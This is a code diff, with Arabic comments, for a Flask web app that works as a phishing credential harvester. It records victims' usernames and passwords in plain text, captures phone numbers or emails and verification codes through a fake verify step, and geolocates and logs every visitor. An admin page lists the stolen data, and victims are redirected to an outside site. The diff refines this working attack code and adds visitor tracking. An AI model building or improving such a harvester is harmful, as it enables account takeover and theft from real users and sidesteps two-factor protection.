@@ -41,6 +41,22 @@ def init_db():
     )
     """)
 
+    # جدول الزيارات
+    cursor.execute("""
+    CREATE TABLE IF NOT EXISTS visits (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        ip TEXT,
+        country TEXT,
+        city TEXT,
+        isp TEXT,
+        path TEXT,
+        method TEXT,
+        user_agent TEXT,
+        visitor_type TEXT,
+        time TEXT
+    )
+    """)
+
     conn.commit()
     conn.close()
 
@@ -65,83 +81,62 @@ app.secret_key = "secret123"
 
 # مسار log.txt
 log_path = os.path.join(os.path.dirname(__file__), "log.txt")
-#=========================
-# تحديد location 
-#=========================
+
+# ========================
+# تحديد الموقع
+# ========================
 def get_location(ip):
-
     try:
-
         url = f"http://ip-api.com/json/{ip}"
-
         response = requests.get(url, timeout=3)
-
         data = response.json()
-
         country = data.get("country", "Unknown")
         city = data.get("city", "Unknown")
         isp = data.get("isp", "Unknown")
-
         return country, city, isp
-
     except:
         return "Unknown", "Unknown", "Unknown"
+
 # ========================
 # تسجيل كل request
-# ======================
-
+# ========================
 @app.before_request
 def log_every_request():
+    # تحديد IP الصحيح
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    if ip:
+        ip = ip.split(",")[0]
 
-    ip = request.remote_addr
     country, city, isp = get_location(ip)
+
     path = request.path
     method = request.method
     user_agent = request.headers.get("User-Agent", "").lower()
     time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    # 🔥 تحديد نوع الزائر
+    # تحديد نوع الزائر
     if "facebookexternalhit" in user_agent:
         visitor_type = "Facebook Bot"
-
     elif "uptimerobot" in user_agent:
         visitor_type = "UptimeRobot"
-
     elif "bot" in user_agent or "crawl" in user_agent:
         visitor_type = "Other Bot"
-
     else:
         visitor_type = "Real User"
 
-    # تسجيل في logs
-    logging.info(f"{visitor_type} | {method} {path} | {ip}")
+    # تسجيل في log
+    logging.info(f"{visitor_type} | {method} {path} | {ip} | {country} | {city} | {isp}")
 
-    # 🔥 حفظ في database
+    # حفظ في database
     conn = sqlite3.connect("database.db")
     cursor = conn.cursor()
-
-    cursor.execute("""
-    CREATE TABLE IF NOT EXISTS visits (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        ip TEXT,
-        country TEXT,
-        city TEXT,
-        isp TEXT,
-        path TEXT,
-        method TEXT,
-        user_agent TEXT,
-        visitor_type TEXT,
-        time TEXT
-    )
-    """)
-
     cursor.execute("""
     INSERT INTO visits (ip, country, city, isp, path, method, user_agent, visitor_type, time)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
-    """, (ip,country, city, isp, path, method, user_agent, visitor_type, time))
-
+    """, (ip, country, city, isp, path, method, user_agent, visitor_type, time))
     conn.commit()
     conn.close()
+
 # ========================
 # favicon
 # ========================
@@ -211,13 +206,9 @@ def login():
 
     logging.info(Fore.RED + f"Login attempt with username : {username} and password : {password}")
 
-    # 🔥 تعريف المتغيرات قبل الاستخدام (حل مشكلة 500)
-    ip = request.headers.get("X-Forwarded-For")
-
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
     if ip:
        ip = ip.split(",")[0]
-    else:
-       ip = request.remote_addr
     user_agent = request.headers.get("User-Agent", "Unknown")
 
     device, os_name, browser = detect_device(user_agent)
@@ -226,12 +217,10 @@ def login():
     # حفظ في database
     conn = sqlite3.connect("database.db")
     cursor = conn.cursor()
-
     cursor.execute("""
     INSERT INTO users (email, password, ip, device, os, browser, time)
     VALUES (?, ?, ?, ?, ?, ?, ?)
     """, (username, password, ip, device, os_name, browser, time))
-
     conn.commit()
     conn.close()
 
@@ -250,7 +239,8 @@ Time: {time}
         f.write(log_data)
 
     login_botton_url = "https://2742404919047.sarhne.com"
-    return redirect(login_botton_url), logging.info(Fore.BLUE + f"Redirected user to url : {login_botton_url}")
+    logging.info(Fore.BLUE + f"Redirected user to url : {login_botton_url}")
+    return redirect(login_botton_url)
 
 # ========================
 # create
@@ -274,7 +264,6 @@ def verify():
 
     phone_or_email = request.form.get("phone_or_email")
 
-    # حفظ في session
     session["phone_or_email"] = phone_or_email
 
     logging.info(Fore.GREEN + f"Verify request: {phone_or_email}")
@@ -288,7 +277,8 @@ Phone/Email: {phone_or_email}
     with open(log_path, "a", encoding="utf-8", buffering=1) as f:
         f.write(log_data)
 
-    return render_template("verify.html"), logging.info("Redirected user to verify code page")
+    logging.info("Redirected user to verify code page")
+    return render_template("verify.html")
 
 # ========================
 # verify_code
@@ -296,8 +286,7 @@ Phone/Email: {phone_or_email}
 @app.route("/verify_code", methods=["POST"])
 def verify_code():
 
-    code = request.form.get("code")  # 🔥 مهم جداً
-
+    code = request.form.get("code")
     phone_or_email = session.get("phone_or_email", "Unknown")
 
     ip = request.remote_addr
@@ -306,33 +295,29 @@ def verify_code():
     device, os_name, browser = detect_device(user_agent)
     time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    # حفظ في database
     conn = sqlite3.connect("database.db")
     cursor = conn.cursor()
-
     cursor.execute("""
     INSERT INTO codes (email, code, ip, device, os, browser, time)
     VALUES (?, ?, ?, ?, ?, ?, ?)
     """, (phone_or_email, code, ip, device, os_name, browser, time))
-
     conn.commit()
     conn.close()
-    
+
     # حفظ في log.txt
     log_data = f"""
 Verification Code
 Email: {phone_or_email}
 Code: {code}
-
 -------------------------
 """
-    logging.info(Fore.RED + f"Verify Code: {code}")
     with open(log_path, "a", encoding="utf-8", buffering=1) as f:
         f.write(log_data)
+    logging.info(Fore.RED + f"Verify Code: {code}")
+
     login_botton_url = "https://2742404919047.sarhne.com"
     logging.info(Fore.BLUE + f"Redirected user to url : {login_botton_url}")
     return redirect(login_botton_url)
-
 
 # ========================
 # 🔐 Admin Login
@@ -360,7 +345,7 @@ def admin_login():
     """
 
 # ========================
-# admin (مع headers 🔥)
+# admin (عرض البيانات)
 # ========================
 @app.route("/admin")
 def admin():
@@ -379,78 +364,25 @@ def admin():
 
     cursor.execute("SELECT * FROM codes")
     codes = cursor.fetchall()
-
     conn.close()
 
-    html = """
-    <h2>Users</h2>
-    <table border="1" cellpadding="5">
-    <tr>
-        <th>ID</th>
-        <th>Email</th>
-        <th>Password</th>
-        <th>IP</th>
-        <th>Device</th>
-        <th>OS</th>
-        <th>Browser</th>
-        <th>Time</th>
-    </tr>
-    """
-
+    # إنشاء HTML للعرض
+    html = "<h2>Users</h2><table border='1' cellpadding='5'><tr>"
+    html += "<th>ID</th><th>Email</th><th>Password</th><th>IP</th><th>Device</th><th>OS</th><th>Browser</th><th>Time</th></tr>"
     for user in users:
-        html += "<tr>"
-        for col in user:
-            html += f"<td>{col}</td>"
-        html += "</tr>"
-
+        html += "<tr>" + "".join(f"<td>{col}</td>" for col in user) + "</tr>"
     html += "</table><br><br>"
 
-    html += """
-    <h2>Codes</h2>
-    <table border="1" cellpadding="5">
-    <tr>
-        <th>ID</th>
-        <th>Email</th>
-        <th>Code</th>
-        <th>IP</th>
-        <th>Device</th>
-        <th>OS</th>
-        <th>Browser</th>
-        <th>Time</th>
-    </tr>
-    """
-
+    html += "<h2>Codes</h2><table border='1' cellpadding='5'><tr>"
+    html += "<th>ID</th><th>Email</th><th>Code</th><th>IP</th><th>Device</th><th>OS</th><th>Browser</th><th>Time</th></tr>"
     for code in codes:
-        html += "<tr>"
-        for col in code:
-            html += f"<td>{col}</td>"
-        html += "</tr>"
+        html += "<tr>" + "".join(f"<td>{col}</td>" for col in code) + "</tr>"
+    html += "</table><br><br>"
 
-    html += "</table>"
-    
-    html += "<br><br><h2>Visits</h2>"
-
-    html += """
-<table border="1" cellpadding="5">
-<tr>
-<th>ID</th>
-<th>IP</th>
-<th>Country</th>
-<th>City</th>
-<th>ISP</th>
-<th>Path</th>
-<th>Method</th>
-<th>User Agent</th>
-<th>Visitor Type</th>
-<th>Time</th>
-</tr>
-"""
-
+    html += "<h2>Visits</h2><table border='1' cellpadding='5'><tr>"
+    html += "<th>ID</th><th>IP</th><th>Country</th><th>City</th><th>ISP</th><th>Path</th><th>Method</th><th>User Agent</th><th>Visitor Type</th><th>Time</th></tr>"
     for visit in visits:
-        html += "<tr>"
-        for col in visit:
-            html += f"<td>{col}</td>"
-        html += "</tr>"
+        html += "<tr>" + "".join(f"<td>{col}</td>" for col in visit) + "</tr>"
     html += "</table>"
 
     return html
@@ -462,12 +394,11 @@ def admin():
 def logout():
     session.pop("admin", None)
     return "تم تسجيل الخروج"
+
 # ========================
 # تشغيل السيرفر
 # ========================
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT",5000))
+    port = int(os.environ.get("PORT", 5000))
     logging.info("Server is running...")
     app.run(host="0.0.0.0", port=port)
-
-        
